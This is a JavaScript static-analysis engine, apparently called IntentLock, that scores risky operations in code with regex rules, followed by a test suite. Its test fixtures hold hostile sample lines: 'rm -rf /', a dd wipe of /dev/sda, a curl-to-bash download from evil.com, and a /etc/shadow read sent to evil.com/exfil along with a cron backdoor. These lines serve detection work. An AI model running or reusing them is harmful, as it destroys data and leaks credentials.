/**
 * Semantic Operation Analysis Engine for JavaScript/TypeScript code
 * Extracts high-level semantic operations with risk scoring
 * Uses regex and string parsing for static analysis (NO external parsers)
 */

function analyzeBehavior(code) {
  const result = {
    routes: [],
    network_calls: [],
    fs_access: false,
    child_process: false,
    hardcoded_secrets: false,
    db_queries: [],
    dependencies: [],
    semantic_operations: []
  };

  // Extract routes - app.get('/route'), app.post('/route'), router.get('/route'), etc.
  const routePattern = /(?:app|router)\.(get|post|put|delete|patch|use)\s*\(\s*['"`]([^'"`]+)['"`]/gi;
  let match;
  while ((match = routePattern.exec(code)) !== null) {
    result.routes.push({
      method: match[1].toUpperCase(),
      path: match[2]
    });
  }

  // Extract network calls - fetch(), axios(), http.get(), https.get(), request()
  const fetchPattern = /fetch\s*\(\s*['"`]([^'"`]+)['"`]/gi;
  while ((match = fetchPattern.exec(code)) !== null) {
    result.network_calls.push(match[1]);
  }

  const axiosPattern = /axios\.(get|post|put|delete|patch)\s*\(\s*['"`]([^'"`]+)['"`]/gi;
  while ((match = axiosPattern.exec(code)) !== null) {
    result.network_calls.push(match[2]);
  }

  const httpPattern = /(?:http|https)\.(get|post|request)\s*\(\s*['"`]([^'"`]+)['"`]/gi;
  while ((match = httpPattern.exec(code)) !== null) {
    result.network_calls.push(match[2]);
  }

  const requestPattern = /request\s*\(\s*['"`]([^'"`]+)['"`]/gi;
  while ((match = requestPattern.exec(code)) !== null) {
    result.network_calls.push(match[1]);
  }

  // Check for file system access
  if (/fs\.(readFile|writeFile|unlink|existsSync|rmdir|mkdir|rename|stat|readdir|appendFile)\s*\(/gi.test(code)) {
    result.fs_access = true;
  }

  // Check for child process execution
  if (/(?:child_process\.)?(exec|spawn|execSync|execFile|fork)\s*\(/gi.test(code)) {
    result.child_process = true;
  }

  // Check for hardcoded secrets
  if (/(apiKey|password|secret|token|auth|credential)\s*=\s*['"`][^'"`]+['"`]/gi.test(code)) {
    result.hardcoded_secrets = true;
  }

  // Extract DB queries - SQL strings and ORM calls
  const sqlPattern = /(SELECT|INSERT|UPDATE|DELETE|FROM|WHERE)[^;]*;/gi;
  const sqlMatches = code.match(sqlPattern) || [];
  result.db_queries = [...new Set(sqlMatches.map(m => m.trim()))];

  // Mongoose/Sequelize patterns
  const mongoPattern = /(?:Model|db\.collection|\.findOne|\.find|\.create|\.updateOne|\.deleteOne)\s*\(/gi;
  if (mongoPattern.test(code)) {
    const mongoMatches = code.match(/(?:Model|db\.collection|\.findOne|\.find|\.create|\.updateOne|\.deleteOne)\s*\([^)]*\)/gi) || [];
    result.db_queries = [...new Set([...result.db_queries, ...mongoMatches])];
  }

  // Extract dependencies - require() and import statements
  const requirePattern = /require\s*\(\s*['"`]([^'"`]+)['"`]\s*\)/gi;
  while ((match = requirePattern.exec(code)) !== null) {
    result.dependencies.push(match[1]);
  }

  const importPattern = /import\s+(?:{[^}]*}|[a-zA-Z0-9_*]+)\s+from\s+['"`]([^'"`]+)['"`]/gi;
  while ((match = importPattern.exec(code)) !== null) {
    result.dependencies.push(match[1]);
  }

  // ============================================================
  // SEMANTIC OPERATION ANALYSIS ENGINE
  // ============================================================

  // 1. DATABASE OPERATIONS
  // ============================================================
  
  // DELETE operations
  const deletePattern = /DELETE\s+FROM\s+(\w+)(?:\s+WHERE\s+(.+?))?(?:;|\n|$)/gi;
  while ((match = deletePattern.exec(code)) !== null) {
    const table = match[1];
    const whereClause = match[2];
    const hasWhere = !!whereClause;
    const scope = hasWhere ? "SINGLE_ROW" : "ALL_ROWS";
    const risk = hasWhere ? "MEDIUM" : "CRITICAL";
    
    result.semantic_operations.push({
      domain: "database",
      action: "DELETE",
      target: table,
      scope: scope,
      risk: risk,
      metadata: {
        has_where_clause: hasWhere,
        bulk_operation: !hasWhere
      },
      raw: match[0].trim()
    });
  }

  // UPDATE operations
  const updatePattern = /UPDATE\s+(\w+)\s+SET\s+(.+?)(?:\s+WHERE\s+(.+?))?(?:;|\n|$)/gi;
  while ((match = updatePattern.exec(code)) !== null) {
    const table = match[1];
    const setClause = match[2];
    const whereClause = match[3];
    const hasWhere = !!whereClause;
    const scope = hasWhere ? "SINGLE_ROW" : "ALL_ROWS";
    const risk = hasWhere ? "MEDIUM" : "HIGH";
    
    result.semantic_operations.push({
      domain: "database",
      action: "UPDATE",
      target: table,
      scope: scope,
      risk: risk,
      metadata: {
        has_where_clause: hasWhere,
        bulk_operation: !hasWhere
      },
      raw: match[0].trim()
    });
  }

  // INSERT operations
  const insertPattern = /INSERT\s+INTO\s+(\w+)\s+(?:VALUES|SELECT)/gi;
  while ((match = insertPattern.exec(code)) !== null) {
    const table = match[1];
    
    result.semantic_operations.push({
      domain: "database",
      action: "INSERT",
      target: table,
      scope: "NEW_RECORD",
      risk: "LOW",
      metadata: {
        bulk_operation: false
      },
      raw: match[0].trim()
    });
  }

  // SELECT operations
  const selectPattern = /SELECT\s+(.+?)\s+FROM\s+(\w+)(?:\s+WHERE\s+(.+?))?(?:;|\n|$)/gi;
  while ((match = selectPattern.exec(code)) !== null) {
    const columns = match[1];
    const table = match[2];
    const whereClause = match[3];
    const hasWhere = !!whereClause;
    
    result.semantic_operations.push({
      domain: "database",
      action: "SELECT",
      target: table,
      scope: hasWhere ? "FILTERED" : "ALL_ROWS",
      risk: "LOW",
      metadata: {
        has_where_clause: hasWhere,
        columns: columns.trim()
      },
      raw: match[0].trim()
    });
  }

  // 2. FILESYSTEM OPERATIONS
  // ============================================================

  // fs.rm with recursive delete
  const fsRmRecursivePattern = /fs\.rm\s*\(\s*['"`]([^'"`]+)['"`]\s*,\s*{\s*recursive\s*:\s*true\s*}\s*\)/gi;
  while ((match = fsRmRecursivePattern.exec(code)) !== null) {
    const path = match[1];
    const isSystemPath = /^\/|^[A-Z]:\\/i.test(path);
    const risk = isSystemPath || path === "/" ? "CRITICAL" : "HIGH";
    
    result.semantic_operations.push({
      domain: "filesystem",
      action: "DELETE",
      target: path,
      scope: "RECURSIVE",
      risk: risk,
      metadata: {
        recursive: true,
        system_path: isSystemPath
      },
      raw: match[0].trim()
    });
  }

  // fs.unlink - delete single file
  const fsUnlinkPattern = /fs\.unlink\s*\(\s*['"`]([^'"`]+)['"`]/gi;
  while ((match = fsUnlinkPattern.exec(code)) !== null) {
    const path = match[1];
    result.semantic_operations.push({
      domain: "filesystem",
      action: "DELETE",
      target: path,
      scope: "FILE",
      risk: "MEDIUM",
      metadata: { recursive: false },
      raw: match[0].trim()
    });
  }

  // fs.rmdir - delete directory
  const fsRmdirPattern = /fs\.rmdir\s*\(\s*['"`]([^'"`]+)['"`]/gi;
  while ((match = fsRmdirPattern.exec(code)) !== null) {
    const path = match[1];
    result.semantic_operations.push({
      domain: "filesystem",
      action: "DELETE",
      target: path,
      scope: "DIRECTORY",
      risk: "MEDIUM",
      metadata: { recursive: false },
      raw: match[0].trim()
    });
  }

  // fs.writeFile - write/overwrite file
  const fsWritePattern = /fs\.writeFile\s*\(\s*['"`]([^'"`]+)['"`]/gi;
  while ((match = fsWritePattern.exec(code)) !== null) {
    const path = match[1];
    result.semantic_operations.push({
      domain: "filesystem",
      action: "WRITE",
      target: path,
      scope: "FILE",
      risk: "MEDIUM",
      metadata: {},
      raw: match[0].trim()
    });
  }

  // fs.appendFile - append to file
  const fsAppendPattern = /fs\.appendFile\s*\(\s*['"`]([^'"`]+)['"`]/gi;
  while ((match = fsAppendPattern.exec(code)) !== null) {
    const path = match[1];
    result.semantic_operations.push({
      domain: "filesystem",
      action: "APPEND",
      target: path,
      scope: "FILE",
      risk: "LOW",
      metadata: {},
      raw: match[0].trim()
    });
  }

  // fs.readFile - read file
  const fsReadPattern = /fs\.readFile\s*\(\s*['"`]([^'"`]+)['"`]/gi;
  while ((match = fsReadPattern.exec(code)) !== null) {
    const path = match[1];
    const isSensitive = /passwd|shadow|key|secret|config|\.env/i.test(path);
    const risk = isSensitive ? "HIGH" : "LOW";
    
    result.semantic_operations.push({
      domain: "filesystem",
      action: "READ",
      target: path,
      scope: "FILE",
      risk: risk,
      metadata: { sensitive_file: isSensitive },
      raw: match[0].trim()
    });
  }

  // 3. NETWORK OPERATIONS
  // ============================================================

  // fetch() - HTTP requests
  const fetchNetPattern = /fetch\s*\(\s*['"`]([^'"`]+)['"`]/gi;
  while ((match = fetchNetPattern.exec(code)) !== null) {
    const url = match[1];
    const domain = extractDomain(url);
    const isSuspicious = isSuspiciousDomain(domain);
    const risk = isSuspicious ? "HIGH" : "MEDIUM";
    
    result.semantic_operations.push({
      domain: "network",
      action: "OUTBOUND_REQUEST",
      target: domain,
      scope: "EXTERNAL",
      risk: risk,
      metadata: {
        url: url,
        suspicious: isSuspicious
      },
      raw: match[0].trim()
    });
  }

  // axios() - HTTP requests
  const axiosNetPattern = /axios\.(get|post|put|delete|patch)\s*\(\s*['"`]([^'"`]+)['"`]/gi;
  while ((match = axiosNetPattern.exec(code)) !== null) {
    const method = match[1].toUpperCase();
    const url = match[2];
    const domain = extractDomain(url);
    const isSuspicious = isSuspiciousDomain(domain);
    const risk = isSuspicious ? "HIGH" : "MEDIUM";
    
    result.semantic_operations.push({
      domain: "network",
      action: `${method}_REQUEST`,
      target: domain,
      scope: "EXTERNAL",
      risk: risk,
      metadata: {
        url: url,
        method: method,
        suspicious: isSuspicious
      },
      raw: match[0].trim()
    });
  }

  // http/https requests
  const httpNetPattern = /(?:http|https)\.(get|post|request)\s*\(\s*['"`]([^'"`]+)['"`]/gi;
  while ((match = httpNetPattern.exec(code)) !== null) {
    const method = match[1].toUpperCase();
    const url = match[2];
    const domain = extractDomain(url);
    const isSuspicious = isSuspiciousDomain(domain);
    const risk = isSuspicious ? "HIGH" : "MEDIUM";
    
    result.semantic_operations.push({
      domain: "network",
      action: `${method}_REQUEST`,
      target: domain,
      scope: "EXTERNAL",
      risk: risk,
      metadata: {
        url: url,
        method: method,
        suspicious: isSuspicious
      },
      raw: match[0].trim()
    });
  }

  // 4. AUTH / PRIVILEGE OPERATIONS
  // ============================================================

  // role = "admin" - privilege escalation
  const roleAdminPattern = /(\w+)\.role\s*=\s*['"`]admin['"`]/gi;
  while ((match = roleAdminPattern.exec(code)) !== null) {
    const target = match[1];
    result.semantic_operations.push({
      domain: "auth",
      action: "PRIVILEGE_ESCALATION",
      target: "admin",
      scope: "USER_ROLE_CHANGE",
      risk: "CRITICAL",
      metadata: {
        object: target,
        privilege_level: "admin"
      },
      raw: match[0].trim()
    });
  }

  // isAdmin = true - privilege escalation
  const isAdminPattern = /(\w+)\.isAdmin\s*=\s*true/gi;
  while ((match = isAdminPattern.exec(code)) !== null) {
    const target = match[1];
    result.semantic_operations.push({
      domain: "auth",
      action: "PRIVILEGE_ESCALATION",
      target: "admin",
      scope: "ADMIN_FLAG",
      risk: "CRITICAL",
      metadata: {
        object: target,
        flag: "isAdmin"
      },
      raw: match[0].trim()
    });
  }

  // grantRole() - grant privileges
  const grantRolePattern = /grantRole\s*\(\s*['"`](\w+)['"`]/gi;
  while ((match = grantRolePattern.exec(code)) !== null) {
    const role = match[1];
    const risk = role === "admin" || role === "root" ? "CRITICAL" : "HIGH";
    
    result.semantic_operations.push({
      domain: "auth",
      action: "GRANT_ROLE",
      target: role,
      scope: "ROLE_ASSIGNMENT",
      risk: risk,
      metadata: { role: role },
      raw: match[0].trim()
    });
  }

  // elevatePrivileges() - escalate privileges
  const elevatePattern = /elevatePrivileges\s*\(\s*\)/gi;
  while ((match = elevatePattern.exec(code)) !== null) {
    result.semantic_operations.push({
      domain: "auth",
      action: "PRIVILEGE_ESCALATION",
      target: "root",
      scope: "SYSTEM_ELEVATION",
      risk: "CRITICAL",
      metadata: {},
      raw: match[0].trim()
    });
  }

  // 5. CHILD PROCESS OPERATIONS
  // ============================================================

  // exec() - shell command execution
  const execPattern = /exec\s*\(\s*['"`]([^'"`]+)['"`]/gi;
  while ((match = execPattern.exec(code)) !== null) {
    const command = match[1];
    const isDestructive = /rm\s+-rf|rm\s+-r|dd\s+if=\/dev\/zero|:(){ *:|fork|mkfs|dd|format|wipe/i.test(command);
    const risk = isDestructive ? "CRITICAL" : "HIGH";
    
    result.semantic_operations.push({
      domain: "process",
      action: "COMMAND_EXECUTION",
      target: command,
      scope: "SYSTEM",
      risk: risk,
      metadata: {
        destructive: isDestructive,
        command_type: "shell"
      },
      raw: match[0].trim()
    });
  }

  // spawn() - process spawning
  const spawnPattern = /spawn\s*\(\s*['"`]([^'"`]+)['"`]/gi;
  while ((match = spawnPattern.exec(code)) !== null) {
    const process = match[1];
    result.semantic_operations.push({
      domain: "process",
      action: "PROCESS_SPAWN",
      target: process,
      scope: "CHILD_PROCESS",
      risk: "MEDIUM",
      metadata: { process_name: process },
      raw: match[0].trim()
    });
  }

  // execSync() - synchronous shell execution
  const execSyncPattern = /execSync\s*\(\s*['"`]([^'"`]+)['"`]/gi;
  while ((match = execSyncPattern.exec(code)) !== null) {
    const command = match[1];
    const isDestructive = /rm\s+-rf|rm\s+-r|dd\s+if=\/dev\/zero|:(){ *:|fork|mkfs|dd|format|wipe/i.test(command);
    const risk = isDestructive ? "CRITICAL" : "HIGH";
    
    result.semantic_operations.push({
      domain: "process",
      action: "COMMAND_EXECUTION",
      target: command,
      scope: "SYSTEM",
      risk: risk,
      metadata: {
        destructive: isDestructive,
        sync: true
      },
      raw: match[0].trim()
    });
  }

  // 6. API ROUTE OPERATIONS
  // ============================================================

  // Express/Fastify routes
  const apiRoutePattern = /(?:app|router)\.(get|post|put|delete|patch|use)\s*\(\s*['"`]([^'"`]+)['"`]/gi;
  while ((match = apiRoutePattern.exec(code)) !== null) {
    const method = match[1].toUpperCase();
    const path = match[2];
    const isAdminRoute = /admin|superuser|root|internal|private/i.test(path);
    const risk = isAdminRoute ? "HIGH" : "LOW";
    
    result.semantic_operations.push({
      domain: "api",
      action: `ROUTE_${method}`,
      target: path,
      scope: "ENDPOINT",
      risk: risk,
      metadata: {
        method: method,
        admin_route: isAdminRoute
      },
      raw: match[0].trim()
    });
  }

  // Remove duplicates from semantic operations
  result.semantic_operations = result.semantic_operations.filter((op, index, self) =>
    index === self.findIndex(o => o.raw === op.raw)
  );

  // Remove duplicates from arrays
  result.routes = result.routes.filter((route, index, self) =>
    index === self.findIndex(r => r.method === route.method && r.path === route.path)
  );
  result.network_calls = [...new Set(result.network_calls)];
  result.db_queries = [...new Set(result.db_queries)];
  result.dependencies = [...new Set(result.dependencies)];

  return result;
}

// Helper function to extract domain from URL
function extractDomain(url) {
  try {
    const urlObj = new URL(url);
    return urlObj.hostname || url;
  } catch (e) {
    // If not a valid URL, try to extract domain manually
    const match = url.match(/(?:https?:\/\/)?([^\/]+)/);
    return match ? match[1] : url;
  }
}

// Helper function to check if domain is suspicious
function isSuspiciousDomain(domain) {
  const suspiciousPatterns = [
    'evil',
    'malicious',
    'steal',
    'hack',
    'phish',
    'trojan',
    'botnet',
    'c2',
    'command',
    'control'
  ];
  
  const lowerDomain = domain.toLowerCase();
  return suspiciousPatterns.some(pattern => lowerDomain.includes(pattern));
}

module.exports = { analyzeBehavior };

// ============================================================
// COMPREHENSIVE TEST CASES
// ============================================================

if (require.main === module) {
  console.log("🧪 IntentLock Semantic Operation Analysis Engine - Test Suite\n");
  console.log("=".repeat(70) + "\n");

  // ============================================================
  // Test 1: BULK DATABASE DELETE (CRITICAL RISK)
  // ============================================================
  console.log("TEST 1: Bulk Database Delete (No WHERE clause)\n");
  const testBulkDelete = `
DELETE FROM student;
  `;
  let result = analyzeBehavior(testBulkDelete);
  console.log("Code:");
  console.log(testBulkDelete);
  console.log("Semantic Operations:");
  console.log(JSON.stringify(result.semantic_operations, null, 2));
  console.log("\n" + "-".repeat(70) + "\n");

  // ============================================================
  // Test 2: TARGETED DATABASE DELETE (MEDIUM RISK)
  // ============================================================
  console.log("TEST 2: Targeted Database Delete (With WHERE clause)\n");
  const testTargetedDelete = `
DELETE FROM student WHERE id=303;
  `;
  result = analyzeBehavior(testTargetedDelete);
  console.log("Code:");
  console.log(testTargetedDelete);
  console.log("Semantic Operations:");
  console.log(JSON.stringify(result.semantic_operations, null, 2));
  console.log("\n" + "-".repeat(70) + "\n");

  // ============================================================
  // Test 3: RECURSIVE FILESYSTEM DELETION (CRITICAL RISK)
  // ============================================================
  console.log("TEST 3: Recursive Filesystem Deletion\n");
  const testFsDeleteRecursive = `
fs.rm("/", { recursive: true });
fs.rm("/home/user/data", { recursive: true });
  `;
  result = analyzeBehavior(testFsDeleteRecursive);
  console.log("Code:");
  console.log(testFsDeleteRecursive);
  console.log("Semantic Operations:");
  console.log(JSON.stringify(result.semantic_operations, null, 2));
  console.log("\n" + "-".repeat(70) + "\n");

  // ============================================================
  // Test 4: OUTBOUND NETWORK REQUESTS (HIGH RISK)
  // ============================================================
  console.log("TEST 4: Outbound Network Requests\n");
  const testNetworkCalls = `
fetch('https://evil.com/steal');
axios.post('https://malicious-botnet.io/api');
https.get('https://trusted.com/data');
  `;
  result = analyzeBehavior(testNetworkCalls);
  console.log("Code:");
  console.log(testNetworkCalls);
  console.log("Semantic Operations:");
  console.log(JSON.stringify(result.semantic_operations, null, 2));
  console.log("\n" + "-".repeat(70) + "\n");

  // ============================================================
  // Test 5: PRIVILEGE ESCALATION (CRITICAL RISK)
  // ============================================================
  console.log("TEST 5: Privilege Escalation\n");
  const testPrivilegeEscalation = `
user.role = "admin";
currentUser.isAdmin = true;
grantRole("root");
elevatePrivileges();
  `;
  result = analyzeBehavior(testPrivilegeEscalation);
  console.log("Code:");
  console.log(testPrivilegeEscalation);
  console.log("Semantic Operations:");
  console.log(JSON.stringify(result.semantic_operations, null, 2));
  console.log("\n" + "-".repeat(70) + "\n");

  // ============================================================
  // Test 6: DANGEROUS SHELL EXECUTION (CRITICAL RISK)
  // ============================================================
  console.log("TEST 6: Dangerous Shell Execution\n");
  const testShellExec = `
exec("rm -rf /");
execSync("rm -rf /home/*/.*");
spawn("dd", ["if=/dev/zero", "of=/dev/sda"]);
exec("curl https://evil.com/malware.sh | bash");
  `;
  result = analyzeBehavior(testShellExec);
  console.log("Code:");
  console.log(testShellExec);
  console.log("Semantic Operations:");
  console.log(JSON.stringify(result.semantic_operations, null, 2));
  console.log("\n" + "-".repeat(70) + "\n");

  // ============================================================
  // Test 7: API ROUTES (ADMIN ROUTES = HIGH RISK)
  // ============================================================
  console.log("TEST 7: API Route Operations\n");
  const testApiRoutes = `
app.get('/api/users', (req, res) => { });
app.post('/admin/users', (req, res) => { });
router.delete('/admin/reset', (req, res) => { });
app.put('/api/profile', (req, res) => { });
  `;
  result = analyzeBehavior(testApiRoutes);
  console.log("Code:");
  console.log(testApiRoutes);
  console.log("Semantic Operations:");
  console.log(JSON.stringify(result.semantic_operations, null, 2));
  console.log("\n" + "-".repeat(70) + "\n");

  // ============================================================
  // Test 8: COMPREHENSIVE REAL-WORLD MALICIOUS CODE
  // ============================================================
  console.log("TEST 8: Comprehensive Real-World Malicious Code\n");
  const testRealWorld = `
const express = require('express');
const fs = require('fs');
const { exec } = require('child_process');
const axios = require('axios');

const app = express();

// Privilege escalation
app.post('/admin/users', (req, res) => {
  const user = req.body;
  user.role = "admin";
  
  // Read sensitive files
  fs.readFile('/etc/shadow', (err, data) => {
    // Exfiltrate data
    axios.post('https://evil.com/exfil', { data: data });
  });
  
  // Execute dangerous command
  exec("rm -rf /important/data");
  
  // Database operations
  const sql = "DELETE FROM users WHERE id > 100";
  
  res.send('ok');
});

app.get('/api/data', (req, res) => {
  const writeOp = fs.writeFile('/etc/cron.d/backdoor', 'malicious');
  res.send('ok');
});
  `;
  result = analyzeBehavior(testRealWorld);
  console.log("Code:");
  console.log(testRealWorld);
  console.log("\nSemantic Operations Summary:");
  result.semantic_operations.forEach((op, idx) => {
    console.log(`${idx + 1}. [${op.risk}] ${op.domain}.${op.action} → ${op.target}`);
  });
  console.log("\nFull Analysis:");
  console.log(JSON.stringify(result, null, 2));
  console.log("\n" + "=".repeat(70));
}
